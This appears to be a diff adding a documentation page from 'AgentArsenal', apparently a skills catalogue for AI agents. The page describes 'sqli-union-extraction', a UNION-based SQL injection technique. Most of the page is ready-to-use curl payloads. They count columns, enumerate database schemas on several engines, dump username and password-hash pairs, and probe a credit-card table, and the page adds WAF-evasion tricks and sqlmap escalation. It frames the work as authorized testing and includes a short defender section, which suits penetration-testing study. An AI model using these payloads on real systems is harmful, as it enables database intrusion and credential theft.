@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: sqli-union-extraction</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>sqli-union-extraction</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when a confirmed SQL injection reflects query output on the</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="web-sqli.html">web-sqli</a></div><div class="deps"><span class="kind">requires:</span> <a href="web-sqli.html">web-sqli</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="api-security-testing.html">api-security-testing</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>curl</td><td>8.5</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>UNION-based extraction is the fastest SQL injection technique because the database prints the stolen data directly into the page. This skill covers the full manual UNION workflow for authorized tests: finding the column count, identifying which columns render on the page, enumerating schema objects, and dumping only the data needed to prove impact. It assumes injection is already confirmed (see sqli-detection) and output is visible. When nothing is printed, use sqli-blind instead.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm which parameter is injectable and that output is reflected.</li>
+<li>Find the column count with ORDER BY, increasing until the page breaks.</li>
+<li>Find visible columns with UNION SELECT of incrementing integers.</li>
+<li>Read the current user, database, and version through a visible column.</li>
+<li>Enumerate databases, then tables, then columns for the target schema.</li>
+<li>Dump the minimum rows needed to prove impact (one or two rows, never full</li>
+<p>PII tables).</p>
+<li>Log every payload and response for the report.</li>
+</ol>
+<h2>1. Column counting</h2>
+<p>ORDER BY breaks when the number exceeds the real column count, so the last working number is your count.</p>
+<pre><code class="language-bash"># Increase n until the page errors or goes blank, then use n-1
+for n in 1 2 3 4 5 6 7 8 9 10; do
+  code=$(curl -s -o /dev/null -w &#x27;%{http_code}&#x27; \
+    &quot;https://target.example/item?id=5%20ORDER%20BY%20$n--%20-&quot;)
+  echo &quot;ORDER BY $n -&gt; HTTP $code&quot;
+done
+
+# Alternative: UNION SELECT NULL counting (works when ORDER BY is filtered)
+for n in 1 2 3 4 5 6; do
+  nulls=$(python3 -c &quot;print(&#x27;,&#x27;.join([&#x27;NULL&#x27;]*$n))&quot;)
+  code=$(curl -s -o /dev/null -w &#x27;%{http_code}&#x27; \
+    &quot;https://target.example/item?id=-5%20UNION%20SELECT%20${nulls}--%20-&quot;)
+  echo &quot;$n NULLs -&gt; HTTP $code&quot;
+done</code></pre>
+<p>Use a negative or nonexistent ID (like <code>-5</code>) so the original row returns nothing and only your UNION row prints.</p>
+<h2>2. Finding visible columns</h2>
+<p>Replace the NULLs with incrementing integers. The numbers that appear on the page are the columns you can read through.</p>
+<pre><code class="language-bash"># Example with 4 columns: see which numbers render
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,3,4--%20-&quot;
+
+# If column 3 renders, read through it
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,user(),4--%20-&quot;
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,version(),4--%20-&quot;
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,database(),4--%20-&quot;</code></pre>
+<p>If no integer renders, the output may be inside an attribute, a hidden field, or a second page. View the raw HTML source before concluding UNION is impossible.</p>
+<h2>3. Schema enumeration</h2>
+<p>Walk the catalog: databases, tables in the target database, columns in the interesting tables.</p>
+<pre><code class="language-bash"># MySQL and MariaDB
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,schema_name,4%20FROM%20information_schema.schemata--%20-&quot;
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,table_name,4%20FROM%20information_schema.tables%20WHERE%20table_schema%3D&#x27;targetdb&#x27;--%20-&quot;
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,column_name,4%20FROM%20information_schema.columns%20WHERE%20table_name%3D&#x27;users&#x27;--%20-&quot;
+
+# PostgreSQL
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,datname,4%20FROM%20pg_database--%20-&quot;
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,tablename,4%20FROM%20pg_tables%20WHERE%20schemaname%3D&#x27;public&#x27;--%20-&quot;
+
+# Microsoft SQL Server
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,name,4%20FROM%20sys.databases--%20-&quot;
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,name,4%20FROM%20targetdb.sys.tables--%20-&quot;</code></pre>
+<p>Concatenate multi-row results into one visible column so a single request returns the whole list.</p>
+<pre><code class="language-bash"># MySQL: one request returns every table name
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,group_concat(table_name),4%20FROM%20information_schema.tables%20WHERE%20table_schema%3D&#x27;targetdb&#x27;--%20-&quot;
+
+# PostgreSQL equivalent
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,string_agg(tablename,&#x27;,&#x27;),4%20FROM%20pg_tables--%20-&quot;</code></pre>
+<h2>4. Targeted dumping with minimal impact</h2>
+<p>Dump only what proves impact. Concatenate credential pairs into the visible column and limit rows.</p>
+<pre><code class="language-bash"># One request: usernames and password hashes, first 3 rows only
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,group_concat(username,0x3a,password),4%20FROM%20targetdb.users%20LIMIT%203--%20-&quot;
+
+# Prove read access to a sensitive table without dumping it fully
+curl -s &quot;https://target.example/item?id=-5%20UNION%20SELECT%201,2,COUNT(*),4%20FROM%20targetdb.credit_cards--%20-&quot;</code></pre>
+<p>Never dump full customer tables, never exfiltrate live PII beyond the minimum proof, and never write to the database during a UNION test unless the rules of engagement explicitly allow it.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Type mismatch kills the UNION. Match column types with</li>
+<p><code>CAST(value AS CHAR)</code> or put NULL in non-visible positions and data only in string columns.</p>
+<li>The application wraps the parameter in quotes you did not expect. Test</li>
+<p>both <code>-5 UNION ... -- -</code> and <code>-5&#x27; UNION ... -- -</code> styles.</p>
+<li>ORDER BY is blocked by a filter. Fall back to the UNION SELECT NULL</li>
+<p>counting loop, which needs no ORDER BY keyword.</p>
+<li>Output lands in a JSON field or HTML attribute. Read view-source and</li>
+<p>search for your marker integers instead of trusting the rendered page.</p>
+<li>Only one row prints and it is the wrong one. Add <code>LIMIT 1,1</code>, <code>LIMIT 2,1</code></li>
+<p>offsets to page through UNION rows one at a time.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No column renders after trying integers: test whether the page prints</li>
+<p>only the first row by using a valid ID plus UNION (the original row may shadow yours), then switch to the negative-ID technique.</p>
+<li>information_schema is blocked: query the target tables directly if you can</li>
+<p>guess names (users, admins, customers), or pivot to error-based extraction which needs no catalog access.</p>
+<li>The WAF strips the word UNION: try case variation, inline comments</li>
+<p>(<code>UN/**/ION</code>), or move to boolean-blind extraction which avoids the keyword entirely.</p>
+<li>Dumping is too slow through the browser: replay the confirmed UNION</li>
+<p>payload through sqlmap with <code>--technique=U</code> to automate enumeration.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see UNION extraction as repeated requests containing <code>UNION</code>, <code>SELECT</code>, and catalog names like <code>information_schema</code> or <code>pg_tables</code>, often with negative IDs and comment terminators. It is the noisiest SQL injection class and the easiest for a WAF to signature. The fix is the same as for all SQL injection: parameterized queries, least-privilege database accounts so the web user cannot read unrelated schemas, and generic error pages that never leak query structure.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application).</li>
+<li>CWE-89 (Improper Neutralization of Special Elements used in an SQL</li>
+<p>Command, SQL Injection).</p>
+<li>OWASP Testing Guide: Testing for SQL Injection (OTG-INPVAL-005).</li>
+<li>PortSwigger Web Security Academy: UNION attack cheat sheet.</li>
+<li>MySQL information_schema reference, PostgreSQL catalog documentation.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
